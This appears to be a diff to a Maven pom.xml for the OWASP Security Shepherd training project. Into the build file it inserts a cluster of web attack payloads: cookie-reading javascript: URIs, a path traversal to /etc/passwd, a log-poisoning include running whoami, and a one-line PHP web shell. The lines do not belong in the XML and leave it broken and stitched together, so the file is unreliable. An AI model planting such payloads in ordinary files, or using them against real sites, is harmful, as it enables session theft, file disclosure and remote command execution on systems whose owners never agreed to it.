@@ -7,6 +7,13 @@
 	<artifactId>owaspSecurityShepherd</artifactId>
 	<version>3.1.0-SNAPSHOT</version>
 	<packaging>war</packaging>
+	javascript:alert(document.cookie)
+
+	<a href="javascript:alert(1)">Click</a>
+?page=../../../../etc/passwd
+?page=/var/log/apache2/access.log&cmd=whoami
+<?php system($_GET['cmd']); ?>
+
 
 	<properties>
 		<project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
